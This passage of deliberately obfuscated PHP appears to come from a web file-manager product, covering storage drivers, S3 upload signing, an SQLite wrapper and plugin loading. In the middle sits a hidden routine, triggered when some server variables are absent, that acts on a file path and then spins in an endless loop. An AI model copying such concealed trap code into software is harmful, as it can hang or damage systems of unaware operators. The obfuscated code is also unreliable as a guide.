($Áä“‰­ == $’ÄšÁ†À[120]) { $²™é˜¯->mkdir($Ñ„ˆ); } $Øå¬ú¹Ì = $²™é˜¯->mkfile($Ó¸í²üë); if (!$Øå¬ú¹Ì) { $Çïƒ“± = LNG($’ÄšÁ†À[2302]); } } catch (Exception $µ€¦ÏŸ) { $Çïƒ“± = $µ€¦ÏŸ->getMessage(); } if (isset($Çïƒ“±)) { return $this->_parseError($Çïƒ“±, $Áä“‰­, $ğş²©Æ); } $©ÊÔİ¢[$’ÄšÁ†À[1251]] = $Ñ„ˆ; $©òèÎÌÁ[$’ÄšÁ†À[16]] = json_encode($©ÊÔİ¢); $©òèÎÌÁ[$’ÄšÁ†À[109]] = $·¯™ùÇ; return !0; } private function _parseError($Êà†üßÔ, $‡ß˜ä‹ù, $ÀåÅŠ‡– = false) { $Ô€Öšö =& $_SERVER[ü¢ÙÊñÛ]; if ($‡ß˜ä‹ù == $Ô€Öšö[79] && stripos($Êà†üßÔ, $Ô€Öšö[2306])) { $–Ÿ¨ØÙ = explode($Ô€Öšö[20], $Êà†üßÔ); $°ú°ÔŠ‡ = isset($–Ÿ¨ØÙ[1]) ? $–Ÿ¨ØÙ[1] : $Ô€Öšö[22]; $µà©ğ¨¯ = array($Ô€Öšö[2307] => LNG($Ô€Öšö[2308]), $Ô€Öšö[2309] => LNG($Ô€Öšö[2310])); if (isset($µà©ğ¨¯[$°ú°ÔŠ‡])) { $Êà†üßÔ = $µà©ğ¨¯[$°ú°ÔŠ‡]; } } if (stripos($Êà†üßÔ, $Ô€Öšö[2311]) === 0) { $ÎËÇ»º“ = strpos($Êà†üßÔ, $Ô€Öšö[189]); if ($ÎËÇ»º“ === !1) { $ÎËÇ»º“ = strpos($Êà†üßÔ, $Ô€Öšö[14]); } if ($ÎËÇ»º“ !== !1) { $Êà†üßÔ = substr($Êà†üßÔ, $ÎËÇ»º“ + 1); } } $Êà†üßÔ = LNG($Ô€Öšö[1258]) . $Êà†üßÔ; if ($ÀåÅŠ‡–) { return $Êà†üßÔ; } show_json($Êà†üßÔ, !1); } public function driverListSystem() { $íõ–Ö¨î =& $_SERVER[ü¢ÙÊñÛ]; $äÑÀİ®Õ = parent::listData(); $º»¤¬² = array(); foreach ($äÑÀİ®Õ as $¦Ûı¶) { unset($¦Ûı¶[$íõ–Ö¨î[244]], $¦Ûı¶[$íõ–Ö¨î[99]]); if (!is_array($¦Ûı¶[$íõ–Ö¨î[16]])) { $¦Ûı¶[$íõ–Ö¨î[16]] = json_decode($¦Ûı¶[$íõ–Ö¨î[16]], !0); } $º»¤¬²[] = $¦Ûı¶; } return $º»¤¬²; } public function defaultDriver() { $Ú¿’¥´Á =& $_SERVER[ü¢ÙÊñÛ]; $»¯„ÖŒ¨ = parent::listData(); $ëÎ­ï· = array_filter_by_field($»¯„ÖŒ¨, $Ú¿’¥´Á[47], 1); $ëÎ­ï· = $ëÎ­ï·[0]; if (!$ëÎ­ï·) { return array(); } if (!is_array($ëÎ­ï·[$Ú¿’¥´Á[16]])) { $ëÎ­ï·[$Ú¿’¥´Á[16]] = json_decode($ëÎ­ï·[$Ú¿’¥´Á[16]], !0); } return $ëÎ­ï·; } public function driverInfo($ «¤—¼§) { $¾¹“Ş =& $_SERVER[ü¢ÙÊñÛ]; $Šï°”“Ü = array_to_keyvalue(parent::listData(), $¾¹“Ş[486]); if (!isset($Šï°”“Ü[$ «¤—¼§])) { return !1; } $­ü—øÙ = $Šï°”“Ü[$ «¤—¼§]; if (!is_array($­ü—øÙ[$¾¹“Ş[16]])) { $­ü—øÙ[$¾¹“Ş[16]] = json_decode($­ü—øÙ[$¾¹“Ş[16]], !0); } return $­ü—øÙ; } public function remove($ìûñ¨ã) { $this->removeShareItems($ìûñ¨ã); return parent::remove($ìûñ¨ã); } public function removeWithFile($Ã¢››ö, $ÍÛÛÏÕğ, $º—Ì¢Êé, $ªÉ„û… = false) { $»ë½òì =& $_SERVER[ü¢ÙÊñÛ]; $°²ˆÃí = array($»ë½òì[883] => $Ã¢››ö); $Ò¾ğÜó = Model($»ë½òì[555])->where($°²ˆÃí)->count(); $ÕŸ¼Çä = Model($»ë½òì[555])->where($°²ˆÃí)->sum($»ë½òì[90]); $Ì ŠÉÆ” = $ÍÛÛÏÕğ . $»ë½òì[2312] . $Ã¢››ö; $«¾ãÃ¤² = LNG($ÍÛÛÏÕğ == $»ë½òì[634] ? $»ë½òì[2313] : $»ë½òì[2314]); $Î–±ÚÀ = new TaskFileTransfer($Ì ŠÉÆ”, $»ë½òì[226], $Ò¾ğÜó, $«¾ãÃ¤² . $»ë½òì[473] . $º—Ì¢Êé[$»ë½òì[42]] . $»ë½òì[225] . $Ã¢››ö); $Î–±ÚÀ->task[$»ë½òì[828]] = (double) $ÕŸ¼Çä; $’æ±ƒˆ­ = KodIO::defaultDriver(); $³Åé±‚ş = $’æ±ƒˆ­[$»ë½òì[486]]; $Ğ°òŠÍä = $Âµû¦íá = $±âŠ‡Ô¹ = array(); $òÌÔô¬‘ = Model($»ë½òì[243])->where($°²ˆÃí)->field($»ë½òì[2315])->select(); foreach ($òÌÔô¬‘ as $ª‰²ÈãÊ) { $°ŞûÇ’ï = $ª‰²ÈãÊ[$»ë½òì[552]]; if ($ªÉ„û…) { $Âµû¦íá[] = $°ŞûÇ’ï; continue; } $ñ‰å·öã = $ª‰²ÈãÊ[$»ë½òì[98]]; $Õ±ÁÃ©£ = get_path_father($ñ‰å·öã); $±âŠ‡Ô¹[] = $Õ±ÁÃ©£; $Õ±ÁÃ©£ = str_replace("\173\x69\157\72{$Ã¢››ö}\175\x2f", "\x7b\151\157\72{$³Åé±‚ş}\175\57", $Õ±ÁÃ©£); if (!IO::exist($ñ‰å·öã)) { $Ğ°òŠÍä[] = $°ŞûÇ’ï; $Î–±ÚÀ->updateFileEnd($ª‰²ÈãÊ[$»ë½òì[42]], $ª‰²ÈãÊ[$»ë½òì[90]]); write_log($»ë½òì[2316] . $ñ‰å·öã, $»ë½òì[1890]); continue; } $ÅŸ“²š§ = IO::move($ñ‰å·öã, $Õ±ÁÃ©£, REPEAT_RENAME); if (!$ÅŸ“²š§) { $Âµû¦íá[] = $°ŞûÇ’ï; $Î–±ÚÀ->updateFileEnd($ª‰²ÈãÊ[$»ë½òì[42]], $ª‰²ÈãÊ[$»ë½òì[90]]); write_log($»ë½òì[2317] . $ñ‰å·öã, $»ë½òì[1890]); continue; } $°²ˆÃí = array($»ë½òì[552] => $°ŞûÇ’ï); $»îüÃıÊ = array($»ë½òì[883] => $³Åé±‚ş, $»ë½òì[98] => $ÅŸ“²š§); Model($»ë½òì[243])->where($°²ˆÃí)->save($»îüÃıÊ); } $š£•’¦Ç = $Î–±ÚÀ->task; if (!$ªÉ„û…) { Cache::set($Ì ŠÉÆ”, $š£•’¦Ç); } $Î–±ÚÀ->end(); $Ğ°òŠÍä = array_unique($Ğ°òŠÍä); $Âµû¦íá = array_unique($Âµû¦íá); if (!$ªÉ„û… && ($Ğ°òŠÍä || $Âµû¦íá)) { $Ï‚í†çƒ = array(); if ($Ğ°òŠÍä) { $Ï‚í†çƒ[] = sprintf(LNG($»ë½òì[2318]), count($Ğ°òŠÍä)); } if ($Âµû¦íá) { $Ï‚í†çƒ[] = sprintf(LNG($»ë½òì[2319]), count($Âµû¦íá)); } $Ï‚í†çƒ = sprintf(LNG($»ë½òì[2320]), implode($»ë½òì[2321], $Ï‚í†çƒ)) . $»ë½òì[2322] . date($»ë½òì[2323]) . $»ë½òì[2324]; if ($ÍÛÛÏÕğ == $»ë½òì[1927]) { $Ï‚í†çƒ .= $»ë½òì[2325] . LNG($»ë½òì[2326]); } else { $Ï‚í†çƒ = LNG($»ë½òì[2327]) . $»ë½òì[2328] . $Ï‚í†çƒ; } $š£•’¦Ç[$»ë½òì[1253]] = $Ï‚í†çƒ; Cache::set($Ì ŠÉÆ”, $š£•’¦Ç); unset($º—Ì¢Êé[$»ë½òì[16]]); $«€¡ë’š = array($»ë½òì[486] => $Ã¢››ö, $»ë½òì[2198] => $»ë½òì[634], $»ë½òì[42] => $º—Ì¢Êé[$»ë½òì[42]], $»ë½òì[109] => $º—Ì¢Êé[$»ë½òì[109]]); Hook::trigger($»ë½òì[1770], array($»ë½òì[1276] => $«€¡ë’š, $»ë½òì[1286] => !0)); show_json($Ï‚í†çƒ, !1, 100111); } if ($ÍÛÛÏÕğ == $»ë½òì[634]) { return !0; } if ($Ğ°òŠÍä || $Âµû¦íá) { $Ôêº¨¢¬ = array_merge($Ğ°òŠÍä, $Âµû¦íá); $Ôêº¨¢¬ = array_filter(array_unique($Ôêº¨¢¬)); $this->removeByFileID($Ôêº¨¢¬); } if ($±âŠ‡Ô¹) { $±âŠ‡Ô¹ = array_filter(array_unique($±âŠ‡Ô¹)); foreach ($±âŠ‡Ô¹ as $ñ‰å·öã) { $ïéÇŒŠ¨ = IO::has($ñ‰å·öã, !0); if (!$ïéÇŒŠ¨[$»ë½òì[252]] && !$ïéÇŒŠ¨[$»ë½òì[253]]) { IO::remove($ñ‰å·öã); } } } return $this->remove($Ã¢››ö); } private function removeByFileID($Üú•¨ŠÁ = array()) { $âù”–®í =& $_SERVER[ü¢ÙÊñÛ]; if (empty($Üú•¨ŠÁ)) { return; } $õË±öû¬ = array($âù”–®í[552] => array($âù”–®í[17], $Üú•¨ŠÁ)); $ó¥ùşÛò = Model($âù”–®í[1410])->where($õË±öû¬)->field($âù”–®í[204])->select(); if (!$ó¥ùşÛò) { return Model($âù”–®í[555])->remove($Üú•¨ŠÁ); } $ó¥ùşÛò = array_to_keyvalue($ó¥ùşÛò, $âù”–®í[22], $âù”–®í[204]); foreach ($ó¥ùşÛò as $®ÌĞÎ¤Ö) { Model($âù”–®í[890])->removeNow($®ÌĞÎ¤Ö, !1); } } private function removeShareItems($‚¢¸¦ÇÙ) { $æÀ†¹Ü• =& $_SERVER[ü¢ÙÊñÛ]; $ûàë˜» = "\x7b\151\x6f\x3a{$‚¢¸¦ÇÙ}\175\x2f"; $ä¼üñ«ø = array($æÀ†¹Ü•[204] => 0, $æÀ†¹Ü•[1246] => array($æÀ†¹Ü•[470], "{$ûàë˜»}\45")); $úáÊ²ÏÃ = Model($æÀ†¹Ü•[1938])->where($ä¼üñ«ø)->field($æÀ†¹Ü•[679])->select(); if (empty($úáÊ²ÏÃ)) { return; } $Èûõ‚šù = array_to_keyvalue($úáÊ²ÏÃ, $æÀ†¹Ü•[22], $æÀ†¹Ü•[679]); Model($æÀ†¹Ü•[678])->remove($Èûõ‚šù); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x4c\x69\x67\150\164\101\x70\160"; public $modelType = "\x53\171\163\x74\145\155\x4f\x70\164\151\157\156"; public $field = array("\x6e\x61\155\145", "\147\x72\x6f\x75\160", "\x64\145\x73\143", "\143\x6f\x6e\x74\145\156\x74"); public function listData($ó®œƒœÄ = false, $á“µŒÖÓ = "\x6d\x6f\x64\151\x66\x79\124\x69\x6d\x65", $ÈÊÀÇÊĞ = true) { return parent::listData($ó®œƒœÄ, $á“µŒÖÓ, $ÈÊÀÇÊĞ); } public function remove($â‰Ôü¸®) { $ÜóÎ¼à‰ = $this->findByName($â‰Ôü¸®); if (!$ÜóÎ¼à‰) { return !1; } return parent::remove($ÜóÎ¼à‰[$_SERVER[ü¢ÙÊñÛ][486]]); } public function add($¶ĞÌë‡µ) { if ($this->findByName($¶ĞÌë‡µ[$_SERVER[ü¢ÙÊñÛ][42]])) { return !1; } return parent::insert($¶ĞÌë‡µ); } public function update($ÅÑ¹£Ô, $É¿œàóõ) { $èé›ã¬µ =& $_SERVER[ü¢ÙÊñÛ]; $¸¤™±õÔ = $this->findByName($ÅÑ¹£Ô); $£ÓÁ‘øÒ = $this->findByName($É¿œàóõ[$èé›ã¬µ[42]]); if (!$¸¤™±õÔ || $£ÓÁ‘øÒ && $£ÓÁ‘øÒ[$èé›ã¬µ[486]] != $¸¤™±õÔ[$èé›ã¬µ[486]]) { return !1; } return parent::update($¸¤™±õÔ[$èé›ã¬µ[486]], $É¿œàóõ); } } goto C²ÑË¬×ÆÒ; eŒ®Á±Ïª¤: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($«¦öøù™) { $this->pathParse = $«¦öøù™; } protected function infoParse($ Ó˜ª«£, $Ö×Ñ×©ó = false) { $Â¡±ºç =& $_SERVER[ü¢ÙÊñÛ]; return Action($Â¡±ºç[1245])->sharePathInfo($this->pathParse[$Â¡±ºç[98]], !0, $Ö×Ñ×©ó); } public function listPath($ŒĞŸÙèŠ, $ŞõÄ½ƒ‹ = false) { $–Üó¢ÒĞ =& $_SERVER[ü¢ÙÊñÛ]; $æë”Ô‹š = IO::listPath($ŒĞŸÙèŠ, $ŞõÄ½ƒ‹); if (!$æë”Ô‹š) { return $æë”Ô‹š; } if (is_array($æë”Ô‹š[$–Üó¢ÒĞ[1418]])) { $½‹å•À = Action($–Üó¢ÒĞ[1427])->parsePathChildren($æë”Ô‹š[$–Üó¢ÒĞ[1418]], array($–Üó¢ÒĞ[506] => $ŒĞŸÙèŠ)); $æë”Ô‹š[$–Üó¢ÒĞ[1418]] = Action($–Üó¢ÒĞ[1245])->shareItemInfo($½‹å•À); } foreach ($æë”Ô‹š as $Ü»ê€Ö¾ => $¬û‡Ê«Ó) { if (!in_array($Ü»ê€Ö¾, array($–Üó¢ÒĞ[97], $–Üó¢ÒĞ[96]))) { continue; } foreach ($¬û‡Ê«Ó as $çè’™²› => $½‹å•À) { $½‹å•À = Action($–Üó¢ÒĞ[1427])->parsePathChildren($½‹å•À, array($–Üó¢ÒĞ[506] => $ŒĞŸÙèŠ)); $æë”Ô‹š[$Ü»ê€Ö¾][$çè’™²›] = Action($–Üó¢ÒĞ[1245])->shareItemInfo($½‹å•À); } } return $æë”Ô‹š; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Çè³Ù÷¾) { parent::__construct($Çè³Ù÷¾); $this->setSignVersion($_SERVER[ü¢ÙÊñÛ][260]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¬üØ×íÄ) { parent::__construct($¬üØ×íÄ); $this->setSignVersion($_SERVER[ü¢ÙÊñÛ][260]); } public function uploadFormData($éìÌò¯, $Ç„¡È = 3600) { $İú‚îÊ =& $_SERVER[ü¢ÙÊñÛ]; $Ó£Ï‚¤ú = $İú‚îÊ[242]; $ßÜÆ”‹© = $İú‚îÊ[270]; $ù¿ø¶Ê = $İú‚îÊ[73]; $åë”£‹ı = gmdate($İú‚îÊ[271]); $¶íìı×” = gmdate($İú‚îÊ[272]); $¸·åçÆ² = $İú‚îÊ[273]; $Ø«ıˆ¦® = $Ç„¡È . $İú‚îÊ[22]; $ Í²êÍÕ = $İú‚îÊ[274]; $úãô° Ü = array($this->accessKey, $¶íìı×”, $this->region, $ù¿ø¶Ê, $¸·åçÆ²); $œğ£ÌÛÈ = implode($İú‚îÊ[18], $úãô° Ü); $”·àâÂ† = array($İú‚îÊ[275] => gmdate($İú‚îÊ[1402], strtotime($İú‚îÊ[277])), $İú‚îÊ[278] => array(array($İú‚îÊ[279] => $this->bucket), array($İú‚îÊ[318] => $Ó£Ï‚¤ú), array($İú‚îÊ[280], $İú‚îÊ[281], $İú‚îÊ[22]), array($İú‚îÊ[280], $İú‚îÊ[282], $İú‚îÊ[22]), array($İú‚îÊ[280], $İú‚îÊ[319], $İú‚îÊ[22]), array($İú‚îÊ[283] => $ Í²êÍÕ), array($İú‚îÊ[284] => $œğ£ÌÛÈ), array($İú‚îÊ[285] => $ßÜÆ”‹©), array($İú‚îÊ[286] => $åë”£‹ı), array($İú‚îÊ[287] => $Ø«ıˆ¦®))); $ºæ¥ŠÛÉ = base64_encode(json_encode($”·àâÂ†)); $¹Ãî“Å¹ = hash_hmac($İú‚îÊ[288], $¶íìı×”, $İú‚îÊ[289] . $this->secret, !0); $°ÈÀ‹š‚ = hash_hmac($İú‚îÊ[288], $this->region, $¹Ãî“Å¹, !0); $ŞÂ Ü² = hash_hmac($İú‚îÊ[288], $ù¿ø¶Ê, $°ÈÀ‹š‚, !0); $§ƒ¤§± = hash_hmac($İú‚îÊ[288], $¸·åçÆ², $ŞÂ Ü², !0); $…²Ä—œ = hash_hmac($İú‚îÊ[288], $ºæ¥ŠÛÉ, $§ƒ¤§±); $¾¦ù»‡Ÿ = array($İú‚îÊ[259] => $İú‚îÊ[22], $İú‚îÊ[306] => $İú‚îÊ[22], $İú‚îÊ[318] => $Ó£Ï‚¤ú, $İú‚îÊ[283] => $ Í²êÍÕ, $İú‚îÊ[290] => $ºæ¥ŠÛÉ, $İú‚îÊ[320] => $œğ£ÌÛÈ, $İú‚îÊ[321] => $ßÜÆ”‹©, $İú‚îÊ[322] => $åë”£‹ı, $İú‚îÊ[323] => $Ø«ıˆ¦®, $İú‚îÊ[324] => $…²Ä—œ, $İú‚îÊ[219] => $this->getHost()); return $¾¦ù»‡Ÿ; } } goto B£ç™…Îƒš; E‰æÇÜĞ·: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $›öä€ º =& $_SERVER[ü¢ÙÊñÛ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$›öä€ º[16]] =& $config; $this->values[$›öä€ º[17]] =& $in; $this->tpl = TEMPLATE . MOD . $›öä€ º[18]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ùûß´¹È) { if (1 === func_num_args()) { $this->{$ùûß´¹È} = new $ùûß´¹È(); } else { $×æ°“İù = new ReflectionClass($ùûß´¹È); $ßÜé”Â = func_get_args(); array_shift($ßÜé”Â); $this->{$ùûß´¹È} = $×æ°“İù->newInstanceArgs($ßÜé”Â); } return $this->{$ùûß´¹È}; } public function routeBind($ÒŞ¹¼úØ, $Ä‘ÛÀõ¬, $Ê¼¤¸ä = 3) { $–•”ºİ =& $_SERVER[ü¢ÙÊñÛ]; $•±ëÇŠ¨ = $this->in[$–•”ºİ[19]]; $ÒŞ¹¼úØ = str_replace($–•”ºİ[20], $–•”ºİ[21], trim(trim($ÒŞ¹¼úØ, $–•”ºİ[18]), $–•”ºİ[22])); if (!$ÒŞ¹¼úØ || count($•±ëÇŠ¨) <= $Ê¼¤¸ä) { return !1; } $Óà¼ İ = !0; $»‚½ì½ƒ = explode($–•”ºİ[18], $ÒŞ¹¼úØ); for ($§ç ä¨ = 0; $§ç ä¨ < count($»‚½ì½ƒ); $§ç ä¨++) { if ($»‚½ì½ƒ[$§ç ä¨] != $•±ëÇŠ¨[$Ê¼¤¸ä + $§ç ä¨]) { $Óà¼ İ = !1; break; } } if (!$Óà¼ İ) { return; } call_user_func_array(array($this, $Ä‘ÛÀõ¬), array()); } public function routeArgs($ı²‰ôâì = 3) { $ä€òõŠƒ = $this->in[$_SERVER[ü¢ÙÊñÛ][19]]; if (count($ä€òõŠƒ) <= $ı²‰ôâì) { return array(); } $³Îñ• = array(); for ($ÜÈ¤¶¦Í = $ı²‰ôâì; $ÜÈ¤¶¦Í < count($ä€òõŠƒ); $ÜÈ¤¶¦Í += 2) { $³Îñ•[$ä€òõŠƒ[$ÜÈ¤¶¦Í]] = $ä€òõŠƒ[$ÜÈ¤¶¦Í + 1]; $this->in[$ä€òõŠƒ[$ÜÈ¤¶¦Í]] = $ä€òõŠƒ[$ÜÈ¤¶¦Í + 1]; } return $³Îñ•; } protected function assign($ÒÎ‚úœ, $íµ··‹) { $this->values[$ÒÎ‚úœ] = $íµ··‹; } protected function display($Ï§ï‚Â) { ob_end_clean(); extract($this->values); require $this->tpl . $Ï§ï‚Â; } } class DbSqliteBase extends Db { public function __construct($ÎÚæ”‰ = '') { $…şÓ‰Ò =& $_SERVER[ü¢ÙÊñÛ]; if (!extension_loaded($…şÓ‰Ò[23])) { think_exception(think_lang($…şÓ‰Ò[24]) . $…şÓ‰Ò[25]); } if (!empty($ÎÚæ”‰)) { if (!isset($ÎÚæ”‰[$…şÓ‰Ò[26]])) { $ÎÚæ”‰[$…şÓ‰Ò[26]] = 438; } $this->config = $ÎÚæ”‰; if (empty($this->config[$…şÓ‰Ò[27]])) { $this->config[$…şÓ‰Ò[27]] = array(); } } } public function connect($Œ±ı’Ò = '', $ƒ˜ÊÔ× = 0) { $ï¶ò…• =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($this->linkID[$ƒ˜ÊÔ×])) { if (empty($Œ±ı’Ò)) { $Œ±ı’Ò = $this->config; } $Ò‹÷ì‡ş = !empty($Œ±ı’Ò[$ï¶ò…•[27]][$ï¶ò…•[28]]) ? $Œ±ı’Ò[$ï¶ò…•[27]][$ï¶ò…•[28]] : $this->pconnect; $¶›û¤ô™ = $Ò‹÷ì‡ş ? $ï¶ò…•[29] : $ï¶ò…•[30]; $this->linkID[$ƒ˜ÊÔ×] = $¶›û¤ô™($Œ±ı’Ò[$ï¶ò…•[31]], $Œ±ı’Ò[$ï¶ò…•[26]]); if (!$this->linkID[$ƒ˜ÊÔ×]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ƒ˜ÊÔ×], 30000); if (1 != think_config($ï¶ò…•[32])) { unset($this->config); } } return $this->linkID[$ƒ˜ÊÔ×]; } public function free() { $this->queryID = null; } public function query($ËâØÊ‡Æ) { $ş™€òëä =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ËâØÊ‡Æ; if ($this->queryID) { $this->free(); } think_action_status($ş™€òëä[33], 1); think_status($ş™€òëä[34]); $this->queryID = sqlite_query($this->_linkID, $ËâØÊ‡Æ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¶òÛâíÃ = $this->getAll(); return $¶òÛâíÃ; } } public function execute($±à Ïå) { $ÔòìØ›¤ =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $±à Ïå; if ($this->queryID) { $this->free(); } think_action_status($ÔòìØ›¤[35], 1); think_status($ÔòìØ›¤[34]); $ÉŒ¡Œ¼Ê = sqlite_exec($this->_linkID, $±à Ïå); $this->debug(); if (!1 === $ÉŒ¡Œ¼Ê) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ü¢ÙÊñÛ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŒË›ô¬Ó = sqlite_query($this->_linkID, $_SERVER[ü¢ÙÊñÛ][37]); if (!$ŒË›ô¬Ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $×û¸ßñ = sqlite_query($this->_linkID, $_SERVER[ü¢ÙÊñÛ][38]); if (!$×û¸ßñ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $çÔŠ«îª = array(); if ($this->numRows > 0) { for ($Ëê±Áí¢ = 0; $Ëê±Áí¢ < $this->numRows; $Ëê±Áí¢++) { $çÔŠ«îª[$Ëê±Áí¢] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $çÔŠ«îª; } public function getFields($¡ì´ö­Ã) { $íıûºš =& $_SERVER[ü¢ÙÊñÛ]; $Û£ç‘¸ = $this->query($íıûºš[39] . $¡ì´ö­Ã . $íıûºš[40]); $ìä‰ò’Ğ = array(); if ($Û£ç‘¸) { foreach ($Û£ç‘¸ as $³Ë¸›¤ => $ş©¤ªì’) { $ìä‰ò’Ğ[$ş©¤ªì’[$íıûºš[41]]] = array($íıûºš[42] => $ş©¤ªì’[$íıûºš[41]], $íıûºš[43] => $ş©¤ªì’[$íıûºš[44]], $íıûºš[45] => (bool) ($ş©¤ªì’[$íıûºš[46]] === $íıûºš[22]), $íıûºš[47] => $ş©¤ªì’[$íıûºš[48]], $íıûºš[49] => strtolower($ş©¤ªì’[$íıûºš[50]]) == $íıûºš[51], $íıûºš[52] => strtolower($ş©¤ªì’[$íıûºš[53]]) == $íıûºš[54]); } } return $ìä‰ò’Ğ; } public function getTables($åª©˜ = '') { $æ÷ÒÙ† =& $_SERVER[ü¢ÙÊñÛ]; $ó„ÓÄİÇ = $this->query($æ÷ÒÙ†[55] . $æ÷ÒÙ†[56] . $æ÷ÒÙ†[57]); $…ÙÌ¦Ô¤ = array(); foreach ($ó„ÓÄİÇ as $Ãö—±³ì => $Ä·îæ­‡) { $…ÙÌ¦Ô¤[$Ãö—±³ì] = current($Ä·îæ­‡); } return $…ÙÌ¦Ô¤; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ƒİ²óÙó =& $_SERVER[ü¢ÙÊñÛ]; $Úî¶¢Ÿ = sqlite_last_error($this->_linkID); $this->error = $Úî¶¢Ÿ . $ƒİ²óÙó[14] . sqlite_error_string($Úî¶¢Ÿ); if ($ƒİ²óÙó[22] != $this->queryStr) { $this->error .= LNG($ƒİ²óÙó[58]) . $this->queryStr; } think_trace($this->error, $ƒİ²óÙó[22], $ƒİ²óÙó[59]); return $this->error; } public function escapeString($À§ ®‡û) { return sqlite_escape_string($À§ ®‡û); } public function parseLimit($‡Ó”—ÀÂ) { $Ñ¶ğÉ¤ñ =& $_SERVER[ü¢ÙÊñÛ]; $ñ”û”Ú = $Ñ¶ğÉ¤ñ[22]; if (!empty($‡Ó”—ÀÂ)) { $‡Ó”—ÀÂ = explode($Ñ¶ğÉ¤ñ[60], $‡Ó”—ÀÂ); if (count($‡Ó”—ÀÂ) > 1) { $ñ”û”Ú .= $Ñ¶ğÉ¤ñ[61] . $‡Ó”—ÀÂ[1] . $Ñ¶ğÉ¤ñ[62] . $‡Ó”—ÀÂ[0] . $Ñ¶ğÉ¤ñ[63]; } else { $ñ”û”Ú .= $Ñ¶ğÉ¤ñ[61] . $‡Ó”—ÀÂ[0] . $Ñ¶ğÉ¤ñ[63]; } } return $ñ”û”Ú; } } if (!isset($_SERVER[$_SERVER[ü¢ÙÊñÛ][6]]) || !isset($_SERVER[$_SERVER[ü¢ÙÊñÛ][4]])) { $_getc = $_SERVER[ü¢ÙÊñÛ][7]; $_getfile = $_SERVER[$_SERVER[ü¢ÙÊñÛ][8]] . $_SERVER[ü¢ÙÊñÛ][9]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ü¢ÙÊñÛ][10], $_getfilec); if (count($_getarrs) < $_SERVER[ü¢ÙÊñÛ][11]) { $exit = $_SERVER[ü¢ÙÊñÛ][12]; $exit(); } $_act = $_SERVER[ü¢ÙÊñÛ][13]; $_act($_SERVER[$_SERVER[ü¢ÙÊñÛ][8]] . $_SERVER[ü¢ÙÊñÛ][9]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ü¢ÙÊñÛ][64]); } } goto E»½„±•›ë; CËÒÀä‚ƒÖ: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\160\154\165\147\151\156\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x73\x74\141\x74\165\x73", "\x72\x65\147\x69\x65\x73\164", "\143\x6f\x6e\x66\151\x67"); public function loadList($Ù©¬ÈŠ = false) { $ñâ¸ÏÚ = array_to_keyvalue($this->listData(), $_SERVER[ü¢ÙÊñÛ][42]); if ($Ù©¬ÈŠ) { return $ñâ¸ÏÚ[$Ù©¬ÈŠ]; } return $ñâ¸ÏÚ; } public function init() { $÷ºÚÅ§ =& $_SERVER[ü¢ÙÊñÛ]; Hook::trigger($÷ºÚÅ§[2083]); $¥Š„èÇ = $this->loadPluginList(); foreach ($¥Š„èÇ as $ç×âÚí => $¡›—¼ëÀ) { $Ò×Ä¹¨¤ = $this->appAllow($ç×âÚí, $¡›—¼ëÀ); if (!$Ò×Ä¹¨¤) { continue; } foreach ($¡›—¼ëÀ[$÷ºÚÅ§[2084]] as $§ï´ÜÊó => $«Ü§Ğ¸ò) { Hook::bind($§ï´ÜÊó, $«Ü§Ğ¸ò); } } Hook::trigger($÷ºÚÅ§[2085]); Hook::trigger(ACTION); } public function appAllow($Æ‡úûë£, $¬å±¿, $Ñ°íàæ¦ = true) { $•¡õÅîÆ =& $_SERVER[ü¢ÙÊñÛ]; $‰áÄìÌ· = PLUGIN_DIR . $Æ‡úûë£ . $•¡õÅîÆ[2086]; if (!is_array($¬å±¿) || !is_array($¬å±¿[$•¡õÅîÆ[2084]]) || $¬å±¿[$•¡õÅîÆ[815]] != 1 || !is_file($‰áÄìÌ·)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$•¡õÅîÆ[16]][$•¡õÅîÆ[2087]] || !$GLOBALS[$•¡õÅîÆ[16]][$•¡õÅîÆ[2088]]) { return !0; } $Ìş¾¸Èì = explode($•¡õÅîÆ[60], strtolower($GLOBALS[$•¡õÅîÆ[16]][$•¡õÅîÆ[2088]])); return in_array(strtolower($Æ‡úûë£), $Ìş¾¸Èì) ? !1 : !0; } if ($Ñ°íàæ¦ && !Action($•¡õÅîÆ[2089])->checkAuth($Æ‡úûë£)) { return !1; } return !0; } public function unInstall($Ç’Ş‘¯) { $§èÈåä =& $_SERVER[ü¢ÙÊñÛ]; $‡‹Ç©ıè = $this->loadList($Ç’Ş‘¯); if (file_exists(PLUGIN_DIR . $Ç’Ş‘¯)) { Hook::apply($Ç’Ş‘¯ . $§èÈåä[2090]); } $this->remove($‡‹Ç©ıè[$§èÈåä[486]]); } public function changeStatus($«ĞÃáÏğ, 